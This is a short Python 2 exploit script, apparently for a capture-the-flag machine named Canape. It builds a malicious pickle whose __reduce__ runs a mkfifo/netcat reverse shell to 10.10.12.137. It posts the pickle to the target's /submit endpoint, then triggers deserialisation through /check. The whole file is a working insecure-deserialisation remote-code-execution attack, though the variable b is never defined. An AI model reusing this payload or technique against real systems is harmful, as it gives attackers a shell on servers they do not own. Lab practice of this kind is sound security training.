import os
import cPickle
from hashlib import md5
import requests

# edit nc ip and port

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("""touch Homer;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.12.137 1795 >/tmp/f""",))
        #return (os.system, ('touch Homer;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.173 1794 >/tmp/f',))


a= cPickle.dumps(Exploit())
print a

# edit current ip of canape

url = 'http://10.10.10.70/submit'
data = dict( quote=b,character=a)
print data
r = requests.post(url, data=data, allow_redirects=True)
if "<strong>Success!</strong> Thank you for your suggestion!" in r.content:
 print "submitted"
else:
 print "no"

md=md5(a+b).hexdigest()
print md


print "triggering exploit"
url1 = 'http://10.10.10.70/check'
data = dict(id=md)
print data
r1=requests.post(url1,data=data,allow_redirects=True)
print "exploited sucessfully"